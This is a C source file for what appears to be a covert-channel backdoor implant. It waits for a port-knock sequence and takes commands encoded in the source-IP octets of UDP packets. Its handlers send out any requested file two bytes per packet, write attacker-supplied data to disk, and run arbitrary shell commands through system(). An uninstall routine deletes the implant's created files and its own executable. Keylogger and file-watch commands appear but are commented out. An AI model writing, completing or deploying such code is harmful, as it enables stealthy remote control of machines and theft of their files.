#include "commands.h"
#include "runner.h"
#include "network.h"

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#define DATA_BUF_SIZE 8192

void print_blob(struct Blob *blob) {
    printf("Data1: %u\n", blob->data1);
    printf("Data2: %u\n", blob->data2);
    printf("Seq Num: %u\n", blob->seq_num);
    printf("Marked: %u\n", blob->marked);
}

void print_list(struct List *list) {
    if (list == NULL) {
        printf("List is NULL\n");
        return;
    }

    printf("===== LIST DUMP =====\n");
    printf("Type: %d\n", list->type);

    struct Blob *curr = list->head->next;
    while (curr != list->tail && curr != NULL) {
        print_blob(curr);
        printf("\n--------------------------\n");
        curr = curr->next;
    }

    printf("=====================\n");
}

void free_list(struct List *list) {
    printf("Freeing list\n");
    struct Blob *curr = list->head;

    while (curr != NULL) {
        struct Blob *next = curr->next;
        free(curr);
        curr = next;
    }
}

int runner_recv(struct Context *ctx, struct List *list) {
    int is_term = 0;
    int is_first = 1;
    while (is_term == 0) {
        uint8_t buffer[BUF_SIZE];

        ssize_t ret = recv(ctx->covert_fd, buffer, BUF_SIZE, 0);
        if (ret < 0) {
            fprintf(stderr, "recv error\n");
            close(ctx->covert_fd);
            return -1;
        }

        const struct iphdr *ip = (struct iphdr *)buffer;
        if (ip->protocol != IPPROTO_UDP) {
            fprintf(stderr, "packet received is not UDP\n");
            return -1;
        }

        const struct udphdr *udp = (struct udphdr *)(buffer + ip->ihl*4);

        if (ntohs(udp->dest) == COVERT_CHAN) {
            struct Blob *blob = calloc(1, sizeof(struct Blob));
            if (is_first) {
                list->head = blob;
                list->tail = blob;
                is_first = 0;
            } else {
                blob->prev = list->tail;
                list->tail->next = blob;
                list->tail = blob;
            }

            // print_packet_info(buffer);
            char ip_buffer[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &ip->saddr, ip_buffer, sizeof(ip_buffer));

            uint8_t byte1 = 0;
            uint8_t byte2 = 0;
            uint8_t byte3 = 0;
            uint8_t byte4 = 0;

            decode_ip(ip_buffer, &byte1, &byte2, &byte3, &byte4);
            printf("------------------Incoming Packet Num: %u------------------\n", ntohs(udp->source));
            printf("Full IP: %s\n", ip_buffer);
            printf("Type: ");
            if (byte2 == 0) {
                printf("Command\n");
                list->type = byte4;
            } else if (byte2 == 1) {
                printf("Term\n");
                is_term = 1;
            } else {
                printf("Data\n");
                printf("Packet secret data: %u %u\n", byte3, byte4);
                blob->data1 = byte3;
                blob->data2 = byte4;
            }

            blob->seq_num = ntohs(udp->source);
            blob->marked = 0;
            list->list_size++;
        }

    }

    print_list(list);

    return 0;
}

int runner(struct Context *ctx) {
    // if command = disconnect, return 1
    // -1 on fatal errors, 0 for uninstall command
    // doesn't return otherwise

    printf("Waiting for knock sequence..\n");
    while (listen_knock(ctx) == 1) {
        printf("Knock was not completed in time after starting\n");
    }
    printf("Knock completed.\n");

    ctx->covert_fd = setup_covert_fd();
    if (ctx->covert_fd < 0) {
        fprintf(stderr, "covert_fd set up error\n");
        return -1;
    }

    int run = 1;

    while (run) {
        printf("Waiting for command...\n");
        struct List cmd_list = {0};
        runner_recv(ctx, &cmd_list);
        switch (cmd_list.type) {
            case CMD_UNINSTALL:
                printf("Uninstall command received\n");
                cmd_uninstall(ctx);
                run = 0;
                break;
            case CMD_REQ_FILE_NAME:
                printf("Request file name received\n");
                cmd_req_file_name(ctx, &cmd_list);
                break;
            case CMD_SEND_FILE_NAME:
                printf("Send file name received\n");
                cmd_send_file_name(ctx, &cmd_list);
                break;
            case CMD_START_KL:
                printf("Start kl command received\n");
                // cmd_start_kl(ctx, &cmd_list);
                break;
            case CMD_START_WATCH_FILE:
                printf("Start watch file command received\n");
                // cmd_start_watch_file(ctx, &cmd_list);
                break;
            case CMD_START_WATCH_DIR:
                printf("Start watch directory command received\n");
                // cmd_start_watch_dir(ctx, &cmd_list);
                break;
            case CMD_REMOTE_RUN:
                printf("Remote run command received\n");
                cmd_remote_run(ctx, &cmd_list);
                break;
            case CMD_DISCONNECT:
                printf("Disconnect command received\n");
                free_list(&cmd_list);
                return 1; // return 1 on disconnect, back to waiting for knock
            default:
                printf("Unknown command received\n");
                break;
        }

        free_list(&cmd_list);

    }

    return 0; // return 0 on uninstall command, runner ends
}

int cmd_req_file_name(struct Context *ctx, struct List *list) {
    // open the file in read only
    // send REP_REQ_FILE_DATA
    // encode, send data (rep_req_file_data)
    // send TERM

    const int PATH_SIZE = 256;
    char file_path[PATH_SIZE];
    memset(file_path, 0, PATH_SIZE);

    char *ptr = file_path;
    struct Blob *curr = list->head;
    while (curr) {
        // Only copy non-null bytes
        if (curr->data1 != 0) *ptr++ = curr->data1;
        if (curr->data2 != 0) *ptr++ = curr->data2;
        curr = curr->next;
    }

    *ptr = '\0'; // Null terminate

    printf("Attempting to open file: %s", file_path);
    const int file_fd = open(file_path, O_RDONLY);
    if (file_fd < 0) {
        fprintf(stderr, "open file failed\n");
        return -1;
    }

    char ip_buffer[IP_ADDR_LEN] = {0};
    uint8_t data_buffer[DATA_BUF_SIZE] = {0};
    int ret;

    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, REP_REQ_FILE_DATA);
    if (ret < 0) {
        fprintf(stderr, "encode cmd failed\n");
    }
    send_packet(ctx, ip_buffer);
    // send file data
    // while not eod, get the next two bytes, encode, ship it

    ssize_t bytes_read;
    while ((bytes_read = read(file_fd, data_buffer, DATA_BUF_SIZE)) > 0) {
        for (ssize_t i = 0; i < bytes_read; i += 2) {
            if (i == bytes_read - 1) {
                // Only one byte left
                ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx), data_buffer[i], 0);
            } else {
                // Two bytes available
                ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx), data_buffer[i], data_buffer[i+1]);
            }
            if (ret < 0) {
                fprintf(stderr, "encode data failed\n");
            }
            send_packet(ctx, ip_buffer);
        }
    }

    // send TERM
    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
    if (ret < 0) {
        fprintf(stderr, "encode term failed\n");
    }
    send_packet(ctx, ip_buffer);

    // might need a strong wait here
    close(file_fd);
    return 0;
}

int cmd_remote_run(struct Context *ctx, struct List *list) {
    if (!list || !list->head) {
        fprintf(stderr, "Remote run list NULL\n");
        return -1;
    }

    const char *cat_str = " > output.txt";

    // Each Blob contributes 2 chars, plus one for terminating null
    size_t ret_size = list->list_size * 2 + 1;
    char *result = malloc(ret_size + strlen(cat_str));
    if (!result)  {
        fprintf(stderr, "malloc failed\n");
        return -1;
    }

    char *ptr = result;
    struct Blob *curr = list->head;
    while (curr) {
        // Only copy non-null bytes
        if (curr->data1 != 0) *ptr++ = curr->data1;
        if (curr->data2 != 0) *ptr++ = curr->data2;
        curr = curr->next;
    }

    *ptr = '\0'; // Null terminate

    // Concatenate the command string
    strcat(result, cat_str);
    printf("Executing command: %s", result);
    // Execute the command
    int ret = system(result);

    // send output.txt

    free(result);
    return ret;
}

int cmd_uninstall(struct Context *ctx) {
    struct created_files *curr = ctx->head;
    while (curr) {
        if (unlink(curr->file_path) == 0) {
            printf("Deleted: %s\n", curr->file_path);
        } else {
            if (errno == ENOENT) {
                // File not found, just skip
                printf("File not found (already deleted?): %s\n", curr->file_path);
            } else {
                // Other errors are reported, but program continues
                perror(curr->file_path);
            }
        }
        curr = curr->next;
    }

    char self_path[PATH_MAX];

    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
    if (len == -1) {
        perror("readlink");
        return 1;
    }
    self_path[len] = '\0';

    if (unlink(self_path) != 0) {
        perror("unlink");
        return 1;
    }

    printf("Deleted self: %s\n", self_path);

    // Continue running safely
    printf("Exiting\n");
    return 0;
}

FILE *open_file_from_list(struct List *list) {
    if (list == NULL) return NULL;

    char filename[256];
    int i = 0;

    struct Blob *curr = list->head->next;

    while (curr != list->tail && i < sizeof(filename) - 1) {
        filename[i++] = curr->data1;

        if (i < sizeof(filename) - 1)
            filename[i++] = curr->data2;

        curr = curr->next;
    }

    filename[i] = '\0';

    FILE *fp = fopen(filename, "a+");  // opens or creates file
    if (fp == NULL) {
        perror("fopen");
        return NULL;
    }

    return fp;
}

int cmd_send_file_name(struct Context *ctx, struct List *list) {
    FILE *fp = open_file_from_list(list);
    if (fp == NULL) {
        return -1;
    }

    struct List data_list = {0};
    runner_recv(ctx, &data_list);

    struct Blob *curr = data_list.head->next;

    while (curr != data_list.tail) {
        fputc(curr->data1, fp);
        fputc(curr->data2, fp);
        curr = curr->next;
    }

    fclose(fp);
    return 0;
}

int listen_knock(struct Context *ctx) {
    const int KNOCK_PORTS[KNOCKS] = {COVERT_CHAN, KNOCK2, KNOCK3};

    for (int i = 0; i < KNOCKS; i++) {
        int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
        if (listen_fd < 0) {
            perror("socket");
            return -1;
        }

        struct sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(KNOCK_PORTS[i]);

        if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            perror("bind");
            close(listen_fd);
            return -1;
        }

        if (listen(listen_fd, 1) < 0) {
            perror("listen");
            close(listen_fd);
            return -1;
        }

        struct sockaddr_in client;
        socklen_t client_len = sizeof(client);

        if (i > 0) {
            struct timeval tv = {
                .tv_sec = KNOCK_TO, .tv_usec = 0
            };
            if (setsockopt(listen_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
                perror("setsockopt");
                close(listen_fd);
                return -1;
            }
        }

        int conn_fd = accept(listen_fd, (struct sockaddr *)&client, &client_len);
        if (conn_fd < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                // Timeout reached
                close(listen_fd);
                return 1;
            } else {
                perror("accept");
                close(listen_fd);
                return -1;
            }
        }

        if (KNOCK_PORTS[i] == KNOCK3) {
            inet_ntop(AF_INET, &client.sin_addr, ctx->commander_ip, INET_ADDRSTRLEN);
            printf("Commander ip: %s\n", ctx->commander_ip);
        }

        close(conn_fd);
        close(listen_fd);

    }

    return 0;

}

int encode_ip(char *buffer, uint8_t byte1, uint8_t byte2, uint8_t byte3, uint8_t byte4) {
    return sprintf(buffer, "%u.%u.%u.%u", byte1, byte2, byte3, byte4);
}


int decode_ip(char *buffer, uint8_t *byte1, uint8_t *byte2, uint8_t *byte3, uint8_t *byte4) {
    return sscanf(buffer, "%hhu.%hhu.%hhu.%hhu", byte1, byte2, byte3, byte4);
}

